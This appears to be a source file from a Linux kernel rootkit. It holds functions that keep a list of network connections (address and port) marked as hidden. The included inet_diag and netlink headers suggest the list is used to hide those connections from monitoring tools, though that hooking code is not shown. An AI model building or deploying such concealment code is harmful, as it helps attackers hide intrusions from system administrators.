#include <linux/version.h>
#include <linux/inet.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>

#include "network.h"


void network_hide_add(struct sockaddr_in addr)
{
    struct hidden_conn *hc;
	
	if (is_addr_hidden(addr))
		return ;

    hc = (struct hidden_conn *)malloc(sizeof(*hc));

	if (!hc)
	    return;

	hc->addr = addr;
    list_add(&hc->list, &hidden_conn_list);
}

void network_hide_remove(struct sockaddr_in addr)
{
    struct hidden_conn *hc;

    list_for_each_entry(hc, &hidden_conn_list, list)
	{
		if (addr.sin_addr.s_addr == hc->addr.sin_addr.s_addr && addr.sin_port == hc->addr.sin_port) { 
				list_del(&hc->list);
				free(hc);
				break; 
		}
	}
}

int is_addr_hidden(struct sockaddr_in addr)
{
    struct hidden_conn *hc;

    list_for_each_entry(hc, &hidden_conn_list, list)
	{
		if (addr.sin_addr.s_addr == hc->addr.sin_addr.s_addr && addr.sin_port == hc->addr.sin_port) 
			return 1;
	}

	return 0;
}

